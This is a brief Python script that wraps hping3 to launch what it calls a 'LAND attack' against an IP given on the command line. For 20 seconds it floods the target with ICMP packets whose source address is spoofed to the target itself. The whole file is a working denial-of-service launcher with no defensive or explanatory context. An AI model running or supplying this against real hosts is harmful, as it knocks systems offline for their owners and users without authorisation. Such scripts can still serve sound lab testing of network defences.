import time
import argparse
import subprocess
from datetime import datetime


def execute_hping3_command(ip):
    try:
        # Use the subprocess.run method to execute the hping3 command
        subprocess.run(["timeout", "20s", "hping3", "-1", "-V", "-d", "120", "-w", "64", "--flood", "-a", ip, ip], check=True)
        print(f"hping3 command executed successfully for {ip}.")
    except subprocess.CalledProcessError as e:
        print(f"Error executing hping3 command for {ip}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Launches LAND Attack against a given IP.")
    parser.add_argument("ip_address", help="IP address to attack")

    args = parser.parse_args()
    ip_address = args.ip_address

    print(f"{datetime.now()} Launching LAND attack against {ip_address}")
    execute_hping3_command(ip_address)